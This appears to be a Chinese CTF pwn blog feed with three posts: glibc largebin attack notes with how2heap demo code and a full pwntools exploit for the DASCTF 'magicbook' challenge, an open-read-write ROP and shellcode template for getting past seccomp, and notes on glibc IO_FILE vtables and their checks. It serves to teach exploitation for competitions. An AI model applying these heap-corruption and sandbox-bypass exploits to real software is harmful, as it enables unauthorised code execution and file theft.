<p>又得知，largbin是按chunk由大到小进行排列的，小的那一方chunk靠近largebin<br>又又得知，对chunk进行操作的三种情况      </p>
<p>（其中chunk_A是P3，chunk_B是P2，p2-&gt;bk是value1-0x10，p2-&gt;bk_nextsize是value2-0x20）<br>(1)、vitim&gt;fwd<br><img src="/images/u1.png" alt="图片"><br>可以看到这里  </p>
<pre><code>victim-&gt;bk_nextsize=fwd-&gt;bknextsize
victime-&gt;bknextsize-&gt;fd_nextsize=victm  
</code></pre>
<p>这里的bk_nextsize-&gt;fd_nextsize被赋值成了victim的头指针.</p>
<p>（2）、victim&lt;fwd<br><img src="/images/u2.png" alt="图片">   </p>
<p>（3）、victim&#x3D;&#x3D;fwd<br><img src="/images/u3.png" alt="图片"><br><br><br>上面是bk_nextsize<br>接下来就是bk<br><img src="/images/largebin_bk.png" alt="图片"></p>
<p>另外需要注意，伪造的堆块fd_nextsize需要设置为0.不然无法通过以下unlink检查。（需要进行伪造的free chunk是victim）<br>    size &#x3D; chunksize (victim);</p>
<pre><code>/*  We know the first chunk in this bin is big enough to use. */
assert ((unsigned long) (size) &gt;= (unsigned long) (nb));

remainder_size = size - nb;

/* unlink */
unlink_chunk (av, victim);  
  
</code></pre>
 <br>
 <br>     
<em>然而上述的用法也只能存在于glbc2.30之前。                  

<p>在其之后则又增加了判断,判断fwd的bk_nextsize的fd_nextsize是等于我们的fwd，由于之前我们都是直接伪造的fwd的fbk_nextsize，所以这新增的条件肯定不满足。</p></em>       <p></p>
<pre><code>if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))
        /* Always insert in the second position.  */
    fwd = fwd-&gt;fd;
else
    &#123;
        victim-&gt;fd_nextsize = fwd;
        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
        if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))
            malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);
            fwd-&gt;bk_nextsize = victim;
            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
                            &#125;
    bck = fwd-&gt;bk;
        if (bck-&gt;fd != fwd)
            malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);
</code></pre>
<br>
<em>不过在其之后又有新的利用手法，利用的是第一个if判断</em>
    

<pre><code>if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;
    fwd = bck;
    bck = bck-&gt;bk;
    victim-&gt;fd_nextsize = fwd-&gt;fd;
    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;
    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
&#125;
</code></pre>
<p>测试案例（how2heap gcc-g 编译）  </p>
<pre><code>// gcc -g 
2 #include &lt;stdio.h&gt;
3 #include &lt;stdlib.h&gt;
4
5 int main()
6 &#123;
7
8     unsigned long stack_var1 = 0;
9     unsigned long stack_var2 = 0;
10
11     fprintf(stderr, &quot;stack_var1 (%p): %ld\n&quot;, &amp;stack_var1, stack_var1);
12     fprintf(stderr, &quot;stack_var2 (%p): %ld\n\n&quot;, &amp;stack_var2, stack_var2);
13
14     unsigned long *p1 = malloc(0x320);
15     malloc(0x20);
16     unsigned long *p2 = malloc(0x400);
17     malloc(0x20);
18     unsigned long p3 = malloc(0x400);
19     malloc(0x20);
20
21     free(p1);
22     free(p2);
23
* 24     void* p4 = malloc(0x90);
25
26     free(p3);
27
28     p2[-1] = 0x3f1;
29     p2[0] = 0;
30     p2[2] = 0;
31     p2[1] = (unsigned long)(&amp;stack_var1 - 2);
32     p2[3] = (unsigned long)(&amp;stack_var2 - 4);
33
34     malloc(0x90);
35
36     fprintf(stderr, &quot;stack_var1 (%p): %p\n&quot;, &amp;stack_var1, (void *)stack_var1);
37     fprintf(stderr, &quot;stack_var2 (%p): %p\n&quot;, &amp;stack_var2, (void *)stack_var2);
38
39     return 0;
40 &#125;      
</code></pre>
<br>

<h2 id="largbinattck-例题"><a href="#largbinattck-例题" class="headerlink" title="largbinattck 例题"></a>largbinattck 例题</h2><h3 id="DASCTF-magicbook"><a href="#DASCTF-magicbook" class="headerlink" title="DASCTF magicbook"></a>DASCTF magicbook</h3><p>于ubuntu题集中，magicbook文件夹  </p>
<pre><code>#!/usr/bin/python3
from pwn import *
from LibcSearcher import *
import os


#context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)


#context.terminal = [&#39;xterm&#39;, &#39;-e&#39;]
context.terminal = [&#39;xfce4-terminal&#39;, &#39;-e&#39;]
#终端更换

p=process(&quot;./pwn&quot;)
#p= remote()
libc = ELF(&quot;libc.so.6&quot;)
elf = ELF(&quot;./pwn&quot;)

def op():
    gdb.attach(p)
    pause()

def inter():
    p.interactive()
    
def sa(content,payload):
    p.sendafter(content,payload)
    
def sla(content,payload):
    p.sendlineafter(content,payload)

def uc64():
    u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))

def uc32():
    u32(p.recvuntil(b&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))

def exec_fmt(pad):#自动获取到fmt的pad
        p = process(&quot;./fmt&quot;)
        # send 还是 sendline以程序为准
        p.send(pad)
        return p.recv()
def add(size):
    sla(&quot;choice:&quot;,str(1))
    sla(&quot;need?&quot;,str(size))

def free(index):
    sla(&quot;choice:&quot;,str(2))
    sla(&quot;delete?&quot;,str(index))

def edit(content):
    sla(&quot;choice:&quot;,str(3))
    sa(&quot;story!&quot;,content)


p.recvuntil(b&quot;0x&quot;)
gift=int(p.recv(12),16)-0x4010
bk_adr=gift+0x4050
bss=gift+0x4010
print(&quot;gift=&quot;,hex(gift))
print(&quot;book=&quot;,hex(bk_adr))
                                                   #（largebin attack）
                                                   
add(0x4e0)
add(0x100)
add(0x4d0)
free(0)
p.sendline(b&#39;n&#39;)
add(0x500)
free(2)
p.recvuntil(b&quot;(y/n)&quot;)
p.sendline(b&#39;y&#39;)
p.recvuntil(b&quot;write?&quot;)
p.sendline(b&#39;0&#39;)
p.recvuntil(b&quot;content: &quot;)
p.send(p64(0)*2+p64(bk_adr-0x20))
add(0x500)                                         #（largebin attack）



rdi=0x0000000000001863+gift
payload=b&#39;a&#39;*0x28+p64(rdi)+p64(elf.got[&#39;puts&#39;]+gift)+p64(gift+elf.plt[&#39;puts&#39;])+p64(gift+0x15E1)
edit(payload)
#p.recvuntil(b&#39;a&#39;*0x28)
got=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
print(&quot;got=&quot;,hex(got))
got=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
print(&quot;got=&quot;,hex(got))
base=got-libc.sym[&#39;puts&#39;]
print(&quot;base=&quot;,hex(base))
rsi=base+0x000000000002be51
rdx_rbx=0x00000000000904a9+base
o=libc.sym[&#39;open&#39;]+base
r=libc.sym[&#39;read&#39;]+base
w=libc.sym[&#39;write&#39;]+base
gets=libc.sym[&#39;gets&#39;]+base
bss=gift+0x4090
print(&quot;bss=&quot;,hex(bss))
payload=b&#39;a&#39;*0x28+p64(rdi)+p64(0)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(0x8)+p64(0)+p64(r)+p64(gift+0x15E1)
p.send(payload)
sleep(0.1)
p.send(b&#39;flag\x00\x00\x00&#39;)
print(&quot;gets=&quot;,hex(gets))
sleep(0.1)
sleep(0.1)
orw=p64(rdi)+p64(bss)+p64(rsi)+p64(0)+p64(o)
orw+=p64(rdi)+p64(3)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(0x30)+p64(0)+p64(r)
orw+=p64(rdi)+p64(1)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(0x30)+p64(0)+p64(w)
p.send(b&#39;a&#39;*0x28+orw)
inter()
</code></pre>
<hr>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>orw模板</title>
    <url>/2024/08/10/orw%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h1 id="orw-模板"><a href="#orw-模板" class="headerlink" title="orw 模板"></a>orw 模板</h1><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a><em>tips</em></h3><p>liunx64：<br>1、read 0、readv 19<br>2、write 1、writev 20<br>3、open 2、openat 257<br>4、sendfile 40    </p>
<br>
 
<h2 id="orw的原型及参数"><a href="#orw的原型及参数" class="headerlink" title="orw的原型及参数"></a>orw的原型及参数</h2><pre><code>1. read
原型: ssize_t read(int fd, void *buf, size_t count);
参数:
fd：文件描述符。
buf：指向存储读取数据的缓冲区的指针。
count：要读取的字节数。      

2. readv
原型: ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
参数:
fd：文件描述符。
iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
iovcnt：iovec 结构体的数量。  

3. write
原型: ssize_t write(int fd, const void *buf, size_t count);
参数:
fd：文件描述符。
buf：指向要写入的数据的缓冲区的指针。
count：要写入的字节数。

4. writev
原型: ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
参数:
fd：文件描述符。
iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
iovcnt：iovec 结构体的数量。

5. open
原型: int open(const char *pathname, int flags, mode_t mode);
参数:
pathname：要打开的文件的路径。
flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
mode：文件权限，仅在使用 O_CREAT 标志时需要。

6. openat
原型: int openat(int dirfd, const char *pathname, int flags, mode_t mode);
参数:
dirfd：目录文件描述符，表示相对路径的基准目录（可以是 AT_FDCWD）。
pathname：要打开的文件的路径。
flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
mode：文件权限，仅在使用 O_CREAT 标志时需要。

7. sendfile
原型: ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
参数:
out_fd：目标文件描述符（通常是套接字）。
in_fd：源文件描述符。
offset：偏移量的指针，用于指定从源文件中开始的字节位置（如果为 NULL，从当前文件位置开始）。
count：要发送的字节数。
</code></pre>
<h3 id="模版"><a href="#模版" class="headerlink" title="模版"></a><em>模版</em></h3><p>只禁用了execve   </p>
<pre><code>o=base+libc.sym[&#39;open&#39;]
r=base+libc.sym[&#39;read&#39;]
w=base+libc.sym[&#39;write&#39;]
orw=p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
orw+=p64(rdi)+p64(3)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(r)
orw+=p64(rdi)+p64(1)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(w)
</code></pre>
<p>其中的寄存器的呈现形式及赋值视情况而变动。</p>
 <br>
 禁用open、execve、read、write、readv、writev

<pre><code>asm(&#39;&#39;&#39;
mov rdi,3;                    #openat调用
mov rdx,0;
mov r10,0;
mov rsi,flag;                 #flag地址
mov rax,257;
syscall;

mov rdi,0;                    #sendfile调用  
mov rsi,3;
mov rdi,1;
xor rdx,rdx;
mov r10,0x33;                 #读取大小
mov rax,40;
syscall;


mov rax,60;                    #exit调用
xor rdi,rdi;
syscall;
&#39;&#39;&#39;
)
</code></pre>
<p>其中指令的表现形式也视具体情况而变动。</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>orw</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>IO</title>
    <url>/2024/07/18/IO/</url>
    <content><![CDATA[<hr>
<h1 id="IO结构体"><a href="#IO结构体" class="headerlink" title="IO结构体"></a><strong>IO结构体</strong></h1><p>关于IO_file_jumps中函数的具体作用可以参考以下两个博客<br><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_3">国资</a>和<a href="https://ray-cp.github.io/">ray-cp</a> 或者星盟的也可以      </p>
<br>
<br>

<h2 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h2><p><em>引入原因： </em><br>对于LBA硬盘来说，读写数据都必须一块一块的读，如果我们每次执行read，write时都是操作很少的数据，则对系统消耗非常大，因此，C库就想了一个好办法——缓冲区。   </p>
<pre><code>1、输入缓冲区   
从外部硬件读取时。为了减少消耗，会一次从外部硬件读取一“块”数据，并放入缓冲区，然后当target需要时，再从头部慢慢读取，只到读完才再次从硬件读取。这个缓冲区叫输入缓冲区。      

对于输入缓冲区ptr-end是有用的数据，base-ptr为已使用的数据。


2、输出缓冲区  
向外部硬件写入时。为了减少消耗，不会一有东西就写入，而是先将内容从source写入缓冲区，当缓冲区满了时候再将内存一起写入硬件。这个缓冲区叫输出缓冲区。

对于输出缓冲区base-ptr是要写入硬件的内容（有用数据），ptr-end为空闲区域。  
</code></pre>
<h2 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="IO_FILE_plus"></a>IO_FILE_plus</h2><pre><code>    struct _IO_FILE_plus
    &#123;
    _IO_FILE file;
    const struct _IO_jump_t *vtable;
    &#125;;
    IO_FILE(结构体）
    - struct _IO_FILE &#123;
    int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
    #define _IO_file_flags _flags

char_IO_read_ptr;   /* Current read pointer */ 
char_IO_read_end;   /* End of get area. */
char_IO_read_base;  /* Start of putback+get area. */
- //read ptr是现在read指针指向的位置，end则是read读取结束的位置，base则是开始的位置
- 

char_IO_write_base; /* Start of put area. */
char_IO_write_ptr;  /* Current put pointer. */
char_IO_write_end;  /* End of put area. */
//write的指针的作用是与read指针的作用是一致的

char_IO_buf_base;   /* Start of reserve area. */
char_IO_buf_end;    /* End of reserve area. */
//缓冲区的位置


/* The following fields are used to support backing up and undo. */
char *_IO_save_base; /* Pointer to start of non-current get area. */
char *_IO_backup_base;  /* Pointer to first valid character of backup area */
char *_IO_save_end; /* Pointer to end of non-current get area. */

struct _IO_marker *_markers;

struct _IO_FILE *_chain;
//chain依次链接的是stdin、stdout、stderr

int _fileno;
//一般指的是目前是在哪个chain里，0是in，1是out，2是err

#if 0
int _blksize;
#else
int _flags2;
#endif
_IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */

#define __HAVE_COLUMN /* temporary */
/* 1+column number of pbase(); 0 is unknown. */
unsigned short _cur_column;
signed char _vtable_offset;
char _shortbuf[1];

/*  char* _save_gptr;  char* _save_egptr; */

_IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
&#125;;
</code></pre>
<br>
<br>

<h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h2><pre><code>struct _IO_jump_t
&#123;
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
&#125;;
</code></pre>
<br>
<br>

<h2 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="IO_str_jumps"></a>IO_str_jumps</h2><pre><code>1. // libio/strops.c
2. 
3. const struct _IO_jump_t _IO_str_jumps libio_vtable =
4. &#123;
5.   JUMP_INIT_DUMMY,
6.   JUMP_INIT(finish, _IO_str_finish),
7.   JUMP_INIT(overflow, _IO_str_overflow),
8.   JUMP_INIT(underflow, _IO_str_underflow),
9.   JUMP_INIT(uflow, _IO_default_uflow),
10.   JUMP_INIT(pbackfail, _IO_str_pbackfail),
11.   JUMP_INIT(xsputn, _IO_default_xsputn),
12.   JUMP_INIT(xsgetn, _IO_default_xsgetn),
13.   JUMP_INIT(seekoff, _IO_str_seekoff),
14.   JUMP_INIT(seekpos, _IO_default_seekpos),
15.   JUMP_INIT(setbuf, _IO_default_setbuf),
16.   JUMP_INIT(sync, _IO_default_sync),
17.   JUMP_INIT(doallocate, _IO_default_doallocate),
18.   JUMP_INIT(read, _IO_default_read),
19.   JUMP_INIT(write, _IO_default_write),
20.   JUMP_INIT(seek, _IO_default_seek),
21.   JUMP_INIT(close, _IO_default_close),
22.   JUMP_INIT(stat, _IO_default_stat),
23.   JUMP_INIT(showmanyc, _IO_default_showmanyc),
24.   JUMP_INIT(imbue, _IO_default_imbue)
25. &#125;;
</code></pre>
<br>
<br>                                                                               
                                                                                             


<h2 id="IO-file-jumps"><a href="#IO-file-jumps" class="headerlink" title="IO_file_jumps"></a>IO_file_jumps</h2><pre><code>&#123;
__dummy = 0,
__dummy2 = 0,
__finish = 0x7ffff7c91a30 &lt;_IO_new_file_finish&gt;,
__overflow = 0x7ffff7c92de0 &lt;_IO_new_file_overflow&gt;,
__underflow = 0x7ffff7c92630 &lt;_IO_new_file_underflow&gt;,
__uflow = 0x7ffff7c95590 &lt;__GI__IO_default_uflow&gt;,
__pbackfail = 0x7ffff7c96dd0 &lt;__GI__IO_default_pbackfail&gt;,
__xsputn = 0x7ffff7c939d0 &lt;_IO_new_file_xsputn&gt;,
__xsgetn = 0x7ffff7c93d10 &lt;__GI__IO_file_xsgetn&gt;,
__seekoff = 0x7ffff7c93150 &lt;_IO_new_file_seekoff&gt;,
__seekpos = 0x7ffff7c95cb0 &lt;_IO_default_seekpos&gt;,
__setbuf = 0x7ffff7c923f0 &lt;_IO_new_file_setbuf&gt;,
__sync = 0x7ffff7c93000 &lt;_IO_new_file_sync&gt;,
__doallocate = 0x7ffff7c85110 &lt;__GI__IO_file_doallocate&gt;,
__read = 0x7ffff7c938a0 &lt;__GI__IO_file_read&gt;,
__write = 0x7ffff7c93930 &lt;_IO_new_file_write&gt;,
__seek = 0x7ffff7c938c0 &lt;__GI__IO_file_seek&gt;,
__close = 0x7ffff7c93920 &lt;__GI__IO_file_close&gt;,
__stat = 0x7ffff7c938d0 &lt;__GI__IO_file_stat&gt;,
__showmanyc = 0x7ffff7c96f80 &lt;_IO_default_showmanyc&gt;,
__imbue = 0x7ffff7c96f90 &lt;_IO_default_imbue&gt;
&#125;
</code></pre>
  <br>

<h3 id="glibc2-24增加的vtable-check"><a href="#glibc2-24增加的vtable-check" class="headerlink" title="glibc2.24增加的vtable_check"></a>glibc2.24增加的vtable_check</h3><pre><code>2.23 的没有任何限制，可以将vtable 劫持在堆上并修改其内容，然后触发FSOP.   

2.24 引入了vtable check，使得将vtable 整体劫持到堆上已不可能，大佬发现可以使用内部的vtable中_IO_str_jumps或_IO_wstr_jumps来进行利用。   

2.31 中将_IO_str_finish函数中强制执行free函数，导致无法使用上述问题，因而催生出其他调用链。


void _IO_vtable_check (void) attribute_hidden;
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
&#123;
uintptr_t section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;
uintptr_t ptr = (uintptr_t) vtable;
uintptr_t offset = ptr -(uintptr_t)__start___libc_IO_vtables;
if (__glibc_unlikely (offset &gt;= section_length))
    _IO_vtable_check ();
return vtable;
&#125;     
</code></pre>
<h4 id="虚表范围-glibc2-37之前"><a href="#虚表范围-glibc2-37之前" class="headerlink" title="虚表范围-glibc2.37之前"></a>虚表范围-glibc2.37之前</h4><p>虚表位置判断主要在IO_validate_vtable函数，2.37以前判断区间为_IO_helper_jumps - _IO_str_jumps之间的区域 0xd60，里面有以下虚表。</p>
<pre><code>_IO_helper_jumps
_IO_helper_jumps
_IO_cookie_jumps
_IO_proc_jumps
_IO_str_chk_jumps
_IO_wstrn_jumps
_IO_wstr_jumps
_IO_wfile_jumps_maybe_mmap
_IO_wfile_jumps_mmap
__GI__IO_wfile_jumps
_IO_wmem_jumps
_IO_mem_jumps
_IO_strn_jumps
_IO_obstack_jumps
_IO_file_jumps_maybe_mmap
_IO_file_jumps_mmap
__GI__IO_file_jumps
_IO_str_jumps
</code></pre>
<p>之后居然还有虚表check绕过<br>详情：<br><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_3">https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_3</a></p>
<br> 
    几个常用的函数：  
  
<pre><code>    1、_IO_new_file_overflow   
    这个函数意图比较简单，主要是处理当输出缓冲区用完时，向硬盘写入数据。当然，其实这个函数内部非常复杂，加入了一些检测。  

    2、_IO_new_file_unflow      
    这个函数与_IO_new_file_overflow差不多，主要是用于从硬盘中读取数据，每次读取都是_IO_buf_base 至 _IO_buf_end。为了防止硬盘中没有这么多数据，设置_IO_read_end为读取的总数。  

    3、__GI__IO_file_read（_IO_file_read）
    这个是输入的最终函数，它将syscall_read进行了一定的封装。

    4、_IO_new_file_write 
    这个是输出的最终函数，它将syscall_write进行了一定的封装。

    5、IO_default_seekpos
    就是调用_IO_new_file_seekoff。

    6、_IO_new_file_seekoff
    设置偏移函数，就是设置我们所说的ptr指针。

    7、__GI__IO_file_xsgetn（_IO_file_xsgetn）
    这个函数是主要目的是将数据从输入缓冲区放入target。
    说明：我们平时的输入函数主要就是调用此函数。

    8、_IO_new_file_xsputn
    这个函数是主要目的是将数据从source放入输出输出缓冲区。
    说明：我们平时的输出函数主要就是调用此函数。
</code></pre>
<hr>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>IO</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
</search>
